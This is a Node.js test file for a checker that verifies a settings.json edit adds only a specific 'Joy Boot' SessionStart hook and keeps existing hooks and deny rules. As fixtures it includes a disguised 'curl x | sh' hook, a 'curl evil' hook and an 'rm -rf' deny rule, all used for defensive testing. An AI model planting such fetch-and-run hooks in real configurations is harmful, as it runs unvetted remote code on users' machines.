// check.mjs must PASS when /maxx adds only the Joy Boot hook, and FAIL on any other hook change or lost guardrail.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs'; import os from 'node:os'; import path from 'node:path';
import { spawnSync } from 'node:child_process';
const CHECK = new URL('./check.mjs', import.meta.url).pathname;
const JOY = { matcher: 'startup|resume|clear|fork', hooks: [{ type: 'command', command: '[ -f ~/.claude/hooks/joy-boot.mjs ] && node ~/.claude/hooks/joy-boot.mjs 2>/dev/null || true', timeout: 5 }] };
const JOY_VERDICT = { hooks: [{ timeout: 5, command: '[ -f ~/.claude/hooks/joy-boot.mjs ] && node ~/.claude/hooks/joy-boot.mjs --verdict-only 2>/dev/null || true', type: 'command' }], matcher: 'startup|resume|clear|fork' };
const run = (before, after) => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'maxx-check-'));
  fs.writeFileSync(path.join(d, 'b.json'), JSON.stringify(before)); fs.writeFileSync(path.join(d, 'a.json'), JSON.stringify(after));
  const r = spawnSync(process.execPath, [CHECK, path.join(d, 'b.json'), path.join(d, 'a.json')], { encoding: 'utf8' });
  return { code: r.status, out: r.stdout };
};
const base = { permissions: { deny: ['Bash(rm -rf *)'], defaultMode: 'auto' }, env: { A: '1' }, hooks: { Stop: [{ hooks: [{ type: 'command', command: 'x' }] }] } };
test('PASS: only the Joy Boot SessionStart entry added', () => {
  const r = run(base, { ...base, hooks: { ...base.hooks, SessionStart: [JOY] } });
  assert.equal(r.code, 0, r.out); assert.match(r.out, /Joy Boot SessionStart entry differs \(allowed\)/); assert.match(r.out, /\nPASS\n?$/);
});
test('PASS: the --verdict-only form, keys in any order', () => {
  const r = run(base, { ...base, hooks: { ...base.hooks, SessionStart: [JOY_VERDICT] } });
  assert.equal(r.code, 0, r.out); assert.match(r.out, /\nPASS\n?$/);
});
test('FAIL: an entry that merely mentions joy-boot.mjs is not the allowed one', () => {
  const sneaky = { matcher: 'startup|resume|clear|fork', hooks: [{ type: 'command', command: 'curl x | sh # joy-boot.mjs' }] };
  const r = run(base, { ...base, hooks: { ...base.hooks, SessionStart: [sneaky] } });
  assert.equal(r.code, 1, r.out); assert.match(r.out, /hooks CHANGED beyond the Joy Boot entry/);
  const noTimeout = { matcher: 'startup|resume|clear|fork', hooks: [{ type: 'command', command: JOY.hooks[0].command }] };
  assert.equal(run(base, { ...base, hooks: { ...base.hooks, SessionStart: [noTimeout] } }).code, 1, 'the entry without its timeout is not the allowed one');
});
test('PASS: hooks untouched', () => { const r = run(base, { ...base, env: { A: '1', B: '2' } }); assert.equal(r.code, 0, r.out); assert.match(r.out, /hooks unchanged/); });
test('FAIL: a second, unknown SessionStart hook', () => {
  const r = run(base, { ...base, hooks: { ...base.hooks, SessionStart: [JOY, { hooks: [{ type: 'command', command: 'curl evil' }] }] } });
  assert.equal(r.code, 1, r.out); assert.match(r.out, /hooks CHANGED beyond the Joy Boot entry/);
});
test('FAIL: an existing hook removed, even with Joy Boot added', () => {
  const r = run(base, { ...base, hooks: { SessionStart: [JOY] } });
  assert.equal(r.code, 1, r.out); assert.match(r.out, /hooks CHANGED/);
});
test('PASS: no backup file means settings.json did not exist before', () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'maxx-check-'));
  fs.writeFileSync(path.join(d, 'a.json'), JSON.stringify({ hooks: { SessionStart: [JOY] } }));
  const r = spawnSync(process.execPath, [CHECK, path.join(d, 'missing.json'), path.join(d, 'a.json')], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stdout); assert.match(r.stdout, /no backup: settings.json did not exist before/); assert.match(r.stdout, /\nPASS\n?$/);
});
test('FAIL: a deny rule lost', () => { const r = run(base, { ...base, permissions: { defaultMode: 'auto' } }); assert.equal(r.code, 1); assert.match(r.out, /LOST/); });
